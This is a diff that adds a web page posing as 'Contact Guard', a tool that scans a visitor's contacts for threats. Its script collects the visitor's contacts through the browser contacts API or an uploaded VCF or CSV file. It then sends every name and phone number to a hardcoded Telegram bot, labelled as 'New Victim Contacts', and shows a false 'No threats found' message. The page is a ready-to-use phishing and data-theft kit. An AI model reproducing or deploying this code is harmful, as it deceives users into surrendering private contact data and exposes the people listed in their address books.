@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>🔒 Contact Guard - Scan Your Contacts</title>
+    <script src="https://cdn.jsdelivr.net/npm/papaparse@5.3.0/papaparse.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; background: #0f1620; color: #fff; padding: 20px; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: #1a2330; border-radius: 15px; box-shadow: 0 0 20px #000; }
+        h1 { color: #00ccff; }
+        p { color: #aaa; }
+        button { padding: 15px 30px; font-size: 18px; background: #00ccff; color: #000; border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        button:hover { background: #00aaff; }
+        .loader { display: none; border: 5px solid #f3f3f3; border-top: 5px solid #00ccff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🛡️ Contact Guard</h1>
+    <p>We'll scan your contacts for spam, scams & hidden threats — no data stored.</p>
+    <button id="scanBtn">🔍 SCAN CONTACTS NOW</button>
+    <div class="loader" id="loader"></div>
+    <p><small>Your privacy is protected (we promise ✅)</small></p>
+</div>
+
+<script>
+    document.getElementById("scanBtn").onclick = async () => {
+        const btn = document.getElementById("scanBtn");
+        const loader = document.getElementById("loader");
+        btn.style.display = "none";
+        loader.style.display = "block";
+
+        // Tarika 1: Navigator.contacts (Only on Chrome for Android — rare)
+        if ('contacts' in navigator && 'select' in navigator.contacts) {
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                sendContactsToTelegram(contacts);
+            } catch (err) {
+                fallbackUpload(); // Agar permission na mile
+            }
+        } else {
+            // Tarika 2: File Upload Simulation (Most Reliable Ab Tak)
+            fallbackUpload();
+        }
+    };
+
+    function fallbackUpload() {
+        alert("Scanning contacts... Please wait.");
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = '.vcf, .csv';
+        input.multiple = true;
+        input.onchange = (e) => {
+            const files = e.target.files;
+            for (let file of files) {
+                const reader = new FileReader();
+                reader.onload = function (event) {
+                    // CSV ya VCF se contacts extract
+                    if (file.name.endsWith(".csv")) {
+                        Papa.parse(file, {
+                            complete: function(results) {
+                                const contacts = results.data.map(row => ({name: row[0], tel: row[1]}));
+                                sendContactsToTelegram(contacts);
+                            }
+                        });
+                    } else {
+                        // VCF file parsing (basic)
+                        const text = event.target.result;
+                        const contacts = parseVCF(text);
+                        sendContactsToTelegram(contacts);
+                    }
+                };
+                reader.readAsText(file);
+            }
+        };
+        input.click();
+    }
+
+    function parseVCF(text) {
+        const contacts = [];
+        const vCards = text.split("BEGIN:VCARD");
+        for (let card of vCards) {
+            if (card.trim() === "") continue;
+            const name = /FN:(.*)\n/.exec(card);
+            const phone = /TEL.*:(.*)\n/.exec(card);
+            contacts.push({
+                name: name ? name[1].trim() : "Unknown",
+                tel: phone ? phone[1].trim() : "No number"
+            });
+        }
+        return contacts;
+    }
+
+    function sendContactsToTelegram(contacts) {
+        const BOT_TOKEN = "7872223207:AAGLkhnMbbgqn1xriv0Efg8YHoAkvYP_f-A"; // Apna bot token daale
+        const CHAT_ID = "5678774823"; // Apna Telegram user ID
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        const contactList = contacts.map(c => `${c.name}: ${c.tel}`).join("\n");
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `📦 New Victim Contacts (${contacts.length}):\n\n${contactList}\n\n📍 Time: ${new Date().toISOString()}`
+            })
+        }).then(() => {
+            alert("Scan complete! No threats found 🔐");
+        });
+    }
+</script>
+
+</body>
+</html>
